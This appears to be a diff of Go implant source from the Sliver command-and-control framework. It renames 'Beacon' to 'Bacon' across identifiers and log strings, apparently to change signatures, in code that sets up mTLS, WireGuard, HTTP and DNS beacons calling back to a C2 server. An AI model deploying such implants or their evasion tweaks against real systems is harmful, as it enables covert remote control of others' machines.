@@ -73,8 +73,8 @@ type BeaconSend func(*pb.Envelope) error
 type BeaconClose func() error
 type BeaconCleanup func() error
 
-// Beacon - Abstract connection to the server
-type Beacon struct {
+// Bacon - Abstract connection to the server
+type Bacon struct {
 	Init    BeaconInit
 	Start   BeaconStart
 	Send    BeaconSend
@@ -87,17 +87,17 @@ type Beacon struct {
 }
 
 // Interval - Interval between beacons
-func (b *Beacon) Interval() int64 {
+func (b *Bacon) Interval() int64 {
 	return GetInterval()
 }
 
 // Jitter - Jitter between beacons
-func (b *Beacon) Jitter() int64 {
+func (b *Bacon) Jitter() int64 {
 	return GetJitter()
 }
 
 // Duration - Interval + random value <= Jitter
-func (b *Beacon) Duration() time.Duration {
+func (b *Bacon) Duration() time.Duration {
 	// {{if .Config.Debug}}
 	log.Printf("Interval: %v Jitter: %v", b.Interval(), b.Jitter())
 	// {{end}}
@@ -112,14 +112,14 @@ func (b *Beacon) Duration() time.Duration {
 	return duration
 }
 
-// StartBeaconLoop - Starts the beacon loop generator
-func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
+// StartBeaconLoop - Starts the bacon loop generator
+func StartBeaconLoop(abort <-chan struct{}) <-chan *Bacon {
 	// {{if .Config.Debug}}
-	log.Printf("Starting beacon loop ...")
+	log.Printf("Starting bacon loop ...")
 	// {{end}}
 
-	var beacon *Beacon
-	nextBeacon := make(chan *Beacon)
+	var bacon *Bacon
+	nextBeacon := make(chan *Bacon)
 
 	innerAbort := make(chan struct{})
 	c2Generator := C2Generator(innerAbort)
@@ -143,25 +143,25 @@ func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
 			// *** MTLS ***
 			// {{if .Config.IncludeMTLS}}
 			case "mtls":
-				beacon = mtlsBeacon(uri)
+				bacon = mtlsBeacon(uri)
 				// {{end}}  - IncludeMTLS
 			case "wg":
 				// *** WG ***
 				// {{if .Config.IncludeWG}}
-				beacon = wgBeacon(uri)
+				bacon = wgBeacon(uri)
 				// {{end}}  - IncludeWG
 			case "https":
 				fallthrough
 			case "http":
 				// *** HTTP ***
 				// {{if .Config.IncludeHTTP}}
-				beacon = httpBeacon(uri)
+				bacon = httpBeacon(uri)
 				// {{end}} - IncludeHTTP
 
 			case "dns":
 				// *** DNS ***
 				// {{if .Config.IncludeDNS}}
-				beacon = dnsBeacon(uri)
+				bacon = dnsBeacon(uri)
 				// {{end}} - IncludeDNS
 
 			default:
@@ -170,7 +170,7 @@ func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
 				// {{end}}
 			}
 			select {
-			case nextBeacon <- beacon:
+			case nextBeacon <- bacon:
 			case <-abort:
 				return
 			}
@@ -181,9 +181,9 @@ func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
 }
 
 // {{if .Config.IncludeMTLS}}
-func mtlsBeacon(uri *url.URL) *Beacon {
+func mtlsBeacon(uri *url.URL) *Bacon {
 	// {{if .Config.Debug}}
-	log.Printf("Beacon -> %s", uri.String())
+	log.Printf("Bacon -> %s", uri.String())
 	// {{end}}
 	var err error
 	lport, err := strconv.Atoi(uri.Port())
@@ -192,7 +192,7 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 	}
 
 	var conn *tls.Conn
-	beacon := &Beacon{
+	bacon := &Bacon{
 		ActiveC2: uri.String(),
 		Init: func() error {
 			return nil
@@ -225,15 +225,15 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 		},
 	}
 
-	return beacon
+	return bacon
 }
 
 // {{end}}
 
 // {{if .Config.IncludeWG}}
-func wgBeacon(uri *url.URL) *Beacon {
+func wgBeacon(uri *url.URL) *Bacon {
 	// {{if .Config.Debug}}
-	log.Printf("Establishing Beacon -> %s", uri.String())
+	log.Printf("Establishing Bacon -> %s", uri.String())
 	// {{end}}
 	lport, err := strconv.Atoi(uri.Port())
 	if err != nil {
@@ -242,7 +242,7 @@ func wgBeacon(uri *url.URL) *Beacon {
 
 	var conn net.Conn
 	var dev *device.Device
-	beacon := &Beacon{
+	bacon := &Bacon{
 		ActiveC2: uri.String(),
 		Init: func() error {
 			return nil
@@ -285,13 +285,13 @@ func wgBeacon(uri *url.URL) *Beacon {
 			return nil
 		},
 	}
-	return beacon
+	return bacon
 }
 
 // {{end}}
 
 // {{if .Config.IncludeHTTP}}
-func httpBeacon(uri *url.URL) *Beacon {
+func httpBeacon(uri *url.URL) *Bacon {
 
 	// {{if .Config.Debug}}
 	log.Printf("Beaconing -> %s", uri)
@@ -300,14 +300,14 @@ func httpBeacon(uri *url.URL) *Beacon {
 	var client *httpclient.SliverHTTPClient
 	var err error
 	opts := httpclient.ParseHTTPOptions(uri)
-	beacon := &Beacon{
+	bacon := &Bacon{
 		ActiveC2: uri.String(),
 		ProxyURL: opts.ProxyConfig,
 		Init: func() error {
 			client, err = httpclient.HTTPStartSession(uri.Host, uri.Path, opts)
 			if err != nil {
 				// {{if .Config.Debug}}
-				log.Printf("[beacon] http(s) connection error %s", err)
+				log.Printf("[bacon] http(s) connection error %s", err)
 				// {{end}}
 				return err
 			}
@@ -330,23 +330,23 @@ func httpBeacon(uri *url.URL) *Beacon {
 		},
 	}
 
-	return beacon
+	return bacon
 }
 
 // {{end}}
 
 // {{if .Config.IncludeDNS}}
-func dnsBeacon(uri *url.URL) *Beacon {
+func dnsBeacon(uri *url.URL) *Bacon {
 	var client *dnsclient.SliverDNSClient
 	var err error
-	beacon := &Beacon{
+	bacon := &Bacon{
 		ActiveC2: uri.String(),
 		Init: func() error {
 			opts := dnsclient.ParseDNSOptions(uri)
 			client, err = dnsclient.DNSStartSession(uri.Hostname(), opts)
 			if err != nil {
 				// {{if .Config.Debug}}
-				log.Printf("[beacon] dns connection error %s", err)
+				log.Printf("[bacon] dns connection error %s", err)
 				// {{end}}
 				return err
 			}
@@ -368,7 +368,7 @@ func dnsBeacon(uri *url.URL) *Beacon {
 			return client.CloseSession()
 		},
 	}
-	return beacon
+	return bacon
 }
 
 // {{end}} - IncludeDNS
